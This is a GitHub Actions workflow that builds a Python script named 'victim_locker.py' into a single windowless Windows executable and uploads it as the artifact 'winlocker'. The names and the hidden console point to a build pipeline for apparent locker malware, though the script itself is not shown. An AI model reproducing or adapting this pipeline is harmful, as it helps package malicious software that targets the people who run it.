name: Build EXE

on: [push]

jobs:
  build:
    runs-on: windows-latest

    steps:
    - uses: actions/checkout@v4
    
    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'
        
    - name: Install dependencies
      run: pip install psutil requests pyinstaller
        
    - name: Build EXE
      run: pyinstaller --onefile --noconsole victim_locker.py
      
    - name: Upload EXE
      uses: actions/upload-artifact@v4
      with:
        name: winlocker
        path: dist/victim_locker.exe
